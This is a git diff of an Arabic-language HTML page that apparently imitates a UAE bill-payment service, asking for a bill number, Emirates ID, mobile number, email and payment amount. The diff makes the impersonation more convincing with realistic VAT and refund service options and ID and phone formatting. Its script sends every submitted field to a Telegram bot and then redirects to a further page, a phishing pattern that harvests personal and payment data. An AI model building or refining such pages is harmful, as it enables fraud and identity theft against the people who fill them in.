@@ -8,7 +8,6 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
     <div class="container">
         <div class="card header-card">
             <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044286479/aPMsccGlDoDqOtLn.jpg" alt="Logo" class="logo">
@@ -19,30 +18,30 @@
             <form id="dataForm">
                 <div class="input-group">
                     <label>رقم الفاتورة</label>
-                    <input type="text" id="billNumber" placeholder="أدخل رقم الفاتورة" required>
+                    <input type="text" id="billNumber" maxlength="6" pattern="\d{6}" title="يجب إدخال 6 أرقام فقط" placeholder="XXXXXX" required>
                 </div>
 
                 <div class="input-group">
                     <label>رقم الهوية</label>
-                    <input type="text" id="idNumber" placeholder="أدخل رقم الهوية" required>
+                    <input type="text" id="idNumber" maxlength="18" placeholder="784-XXXX-XXXXXXX-X" required>
                 </div>
 
                 <div class="input-group">
                     <label>رقم الجوال</label>
-                    <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" required>
+                    <input type="tel" id="phoneNumber" maxlength="10" placeholder="05XXXXXXXX" pattern="^05[0245568]\d{7}$" title="يرجى إدخال رقم هاتف إماراتي صحيح (10 أرقام)" required>
                 </div>
 
                 <div class="input-group">
                     <label>البريد الإلكتروني</label>
-                    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+                    <input type="email" id="email" placeholder="example@domain.com" required>
                 </div>
 
                 <div class="input-group">
                     <label>نوع الخدمة</label>
                     <select id="serviceType" required>
                         <option value="" disabled selected>اختر نوع الخدمة</option>
-                        <option value="خدمة 1">خدمة 1</option>
-                        <option value="خدمة 2">خدمة 2</option>
+                        <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
+                        <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
                     </select>
                 </div>
 
@@ -60,14 +59,39 @@
     </div>
 
     <script>
-        const token = "ضع_هنا_توكن_البوت_الخاص_بك";
-        const chatId = "ضع_هنا_الآي_دي_الخاص_بك";
+        // تنسيق تلقائي لرقم الهوية أثناء الكتابة
+        document.getElementById('idNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = "";
+            if (value.length > 0) formatted += value.substring(0, 3);
+            if (value.length > 3) formatted += "-" + value.substring(3, 7);
+            if (value.length > 7) formatted += "-" + value.substring(7, 14);
+            if (value.length > 14) formatted += "-" + value.substring(14, 15);
+            e.target.value = formatted;
+        });
+
+        // منع إدخال غير الأرقام في حقل الفاتورة والجوال
+        const numericFields = ['billNumber', 'phoneNumber'];
+        numericFields.forEach(id => {
+            document.getElementById(id).addEventListener('keypress', function (e) {
+                if (e.which < 48 || e.which > 57) e.preventDefault();
+            });
+        });
+
+        const telegramToken = "YOUR_BOT_TOKEN"; 
+        const telegramChatId = "YOUR_CHAT_ID";
 
         document.getElementById('dataForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            // تحقق إضافي من طول الهوية
+            if(document.getElementById('idNumber').value.length < 18) {
+                alert("رقم الهوية الإماراتية غير مكتمل");
+                return;
+            }
+
             const message = `
-🔔 **بيان جديد من سداد الإمارات**
+🔔 **طلب سداد جديد**
 --------------------------
 📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
 🆔 رقم الهوية: ${document.getElementById('idNumber').value}
@@ -77,14 +101,13 @@
 💰 المبلغ: ${document.getElementById('amount').value} AED
             `;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-            }).then(res => {
-                alert("تم تأكيد البيانات بنجاح");
-                // هنا يمكنك توجيهه للصفحة الثالثة عند استلام اللقطة القادمة
-            }).catch(err => alert("خطأ في الإرسال"));
+                body: JSON.stringify({ chat_id: telegramChatId, text: message })
+            }).then(() => {
+                window.location.href = "page3.html";
+            }).catch(() => alert("خطأ في الاتصال"));
         });
     </script>
 </body>
